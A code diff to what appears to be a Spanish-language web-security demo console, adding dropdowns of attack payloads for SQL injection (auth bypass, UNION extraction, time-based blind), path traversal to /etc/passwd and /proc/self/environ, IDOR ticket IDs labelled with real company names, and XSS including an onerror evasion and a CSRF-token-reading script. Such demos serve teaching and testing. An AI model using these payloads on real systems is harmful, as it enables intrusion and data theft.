@@ -162,8 +162,12 @@ const TOOLS = {
                     <option value="/api/v1/auth/login">Login Inseguro (v1)</option>
                     <option value="/api/v2/auth/login">Login Seguro (v2)</option>
                  </select>
-                 <label class="cfg-label">PAYLOAD</label>
-                 <input class="cfg-input" id="sqli-payload" value="' OR '1'='1'--">`,
+                 <label class="cfg-label">PAYLOAD (Avanzado)</label>
+                 <select class="cfg-input" id="sqli-payload">
+                    <option value="' OR '1'='1'--">Bypass: Auth Bypass Clásico</option>
+                    <option value="' UNION SELECT 'admin','hash',NULL,NULL,NULL--">Union: Extracción de Columnas</option>
+                    <option value="' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--">Blind: Time-Based (5s Delay)</option>
+                 </select>`,
         run: runSQLi
     },
     brute: {
@@ -179,17 +183,33 @@ const TOOLS = {
     },
     lfi: {
         title: 'LFI / Path Traversal',
-        config: `<label class="cfg-label">ARCHIVO OBJETIVO</label><select class="cfg-input" id="lfi-file"><option value="../../../../../../../etc/hostname">/etc/hostname</option><option value="../../../../../../../etc/passwd">/etc/passwd</option></select>`,
+        config: `<label class="cfg-label">ARCHIVO OBJETIVO</label>
+                 <select class="cfg-input" id="lfi-file">
+                    <option value="../../../../../../../etc/hostname">/etc/hostname (Sistema)</option>
+                    <option value="../../../../../../../etc/passwd">/etc/passwd (Usuarios)</option>
+                    <option value="../../../../../../../var/www/html/index.php">index.php (Código Fuente)</option>
+                    <option value="../../../../../../../proc/self/environ">proc/self/environ (Envenenamiento)</option>
+                 </select>`,
         run: runLFI
     },
     idor: {
         title: 'IDOR',
-        config: `<label class="cfg-label">ID VÍCTIMA</label><input class="cfg-input" id="idor-id" value="1024">`,
+        config: `<label class="cfg-label">ID VÍCTIMA (Registro ajeno)</label>
+                 <select class="cfg-input" id="idor-id">
+                    <option value="1024">Ticket #1024 (MAPFRE)</option>
+                    <option value="1">Ticket #1 (Root/Admin)</option>
+                    <option value="999">Ticket #999 (Iberdrola)</option>
+                 </select>`,
         run: runIDOR
     },
     xss: {
         title: 'XSS Reflejado',
-        config: `<label class="cfg-label">PAYLOAD</label><input class="cfg-input" id="xss-payload" value="<script>fetch('/api/v2/auth/csrf').then(r=>r.json()).then(d=>alert('XSS Exfiltrado (CSRF Token): ' + d.csrfToken))<\/script>">`,
+        config: `<label class="cfg-label">PAYLOAD (Evasión)</label>
+                 <select class="cfg-input" id="xss-payload">
+                    <option value="<script>alert('XSS_Ejecutado')<\/script>">Básico: <script> alert</option>
+                    <option value="<img src=x onerror=alert('XSS_Image_Bypass')>">Evasión: <img> onerror</option>
+                    <option value="<script>fetch('/api/v2/auth/csrf').then(r=>r.json()).then(d=>alert('XSS Exfiltrado (CSRF Token): ' + d.csrfToken))<\/script>">Avanzado: Exfiltración CSRF</option>
+                 </select>`,
         run: runXSS
     },
     dos: {
